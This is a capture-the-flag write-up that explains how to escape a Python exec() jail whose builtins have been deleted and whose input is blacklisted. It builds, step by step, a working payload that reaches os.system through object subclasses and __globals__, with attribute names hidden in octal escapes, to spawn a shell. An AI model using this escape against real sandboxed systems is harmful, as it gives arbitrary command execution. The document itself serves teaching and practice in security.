We are given a pyjail where our payload is run against an `exec()` call with no length restrictions, and a simple blacklist is also implemented.

The more concerning aspect of the jail is the deletion of methods and classes from `__builtins__`, meaning direct access is completely removed.

Since no Dockerfile is provided, we have no way of knowing the exact location of the flag file, so the best option is to spawn a shell.  

A pretty common trick to bypass `__builtins__` nukes is to access subclasses through an attribute chain on a tuple.  

```python
().__class__.__base__.__subclasses__()
```

Our target would be the `os.wrap_close` class, as it contains a reference to `__globals__`, which we can use to execute system commands.  

Since `[]` is blacklisted, we can filter and access the class through dictionary comprehension. I'm also using an f-string to get the class name as `str()` has been nuked.  

```python
{'x':x for x in ().__class__.__base__.__subclasses__() if 'wrap_close' in f'{x}'}.get('x')
```

We can use another attribute chain to get a reference to `os.system` and execute `sh`.  

```python
{'x':x for x in ().__class__.__base__.__subclasses__() if 'wrap_close' in f'{x}'}.get('x').__init__.__globals__.get('system')('sh')
```

Bypassing the blacklist is pretty straightforward, as we can simply use octal encoding and `getattr()`.  

```python
getattr(getattr({'x':x for x in getattr(getattr(getattr((), "\137\137\143\154\141\163\163\137\137"), "\137\137\142\141\163\145\137\137"), "\137\137\163\165\142\143\154\141\163\163\145\163\137\137")() if 'wrap_close' in f'{x}'}.get('x'), '\137\137\151\156\151\164\137\137'), "\137\137\147\154\157\142\141\154\163\137\137").get('\163\171\163\164\145\155')('\163\150')
```

Submitting the payload then spawns a shell which reveals the flag file in the current directory.
